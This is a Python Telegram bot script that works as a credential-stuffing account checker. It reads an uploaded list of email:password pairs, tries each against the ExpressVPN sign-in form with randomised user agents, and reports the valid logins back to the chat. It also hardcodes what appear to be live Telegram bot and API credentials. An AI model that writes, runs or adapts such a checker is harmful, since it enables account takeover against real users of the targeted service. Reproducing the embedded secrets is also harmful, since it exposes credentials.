from pyrogram import Client, filters
from bs4 import BeautifulSoup
import requests
import pyromod
from pyrogram.types import Message
import mechanize
import os
from user_agent import generate_user_agent

# Telegram bot token (replace with your bot token)
BOT_TOKEN = "6685119417:AAGGYkc1ztEbtILrx3VmY4i8_HgzwhqdRAI"
api_id = 6590520
api_hash = "7f31db7e8cd1c0959c187e2651935c00"
# Initialize Pyrogram client
app = Client("hma_bot",api_id=api_id, api_hash=api_hash, bot_token=BOT_TOKEN)

def hma_login(email, password):
    try:
        express = mechanize.Browser()
        express.set_handle_robots(False)
        express.addheaders = [('User-Agent', generate_user_agent())]
        express.open("https://www.expressvpn.com/sign-in")
        express.select_form(nr=0)
        express.form['email'] = email
        express.form['password'] = password 
        vpn = express.submit().read()
        if "Invalid email or password." in str(vpn):
            return False, "Invalid credentials."
        elif "Verification" in str(vpn) or "verify" in str(vpn):
            return False, "Verification required."
        else:
            return True, "Login successful."  
    except Exception as e:
        return False, f"Login Failed: {str(e)}"

@app.on_message(filters.command(["hma"]))
async def trans(client, m: Message):
        try:
            editable = await m.reply_text("**Send Text file **")
            input: Message = await app.listen(editable.chat.id)
            x = await input.download()

            path = f"./downloads/"
            editable = await m.reply_text(f"Starting Account Checking.........")

            with open(x, 'r') as file:
                for line in file:
                    line = line.strip()
                    if ':' in line:
                        email, password = line.split(':', 1)
                        success, message = hma_login(email, password)
                        if success:
                            result_message = f"Good Login for {email} : {password}"
                            await app.send_message(m.chat.id, result_message)
                        else:
                            result_message = f"Bad Login for {email}: {password} - {message}"
                            await app.send_message(m.chat.id, result_message)
                    else:
                        result_message = f"Invalid line format: {line}"
                        await app.send_message(m.chat.id, result_message)
    
        except Exception as e:
            await app.send_message(m.chat.id, f"An error occurred: {str(e)}")

# Start the bot
if __name__ == "__main__":
    app.run()

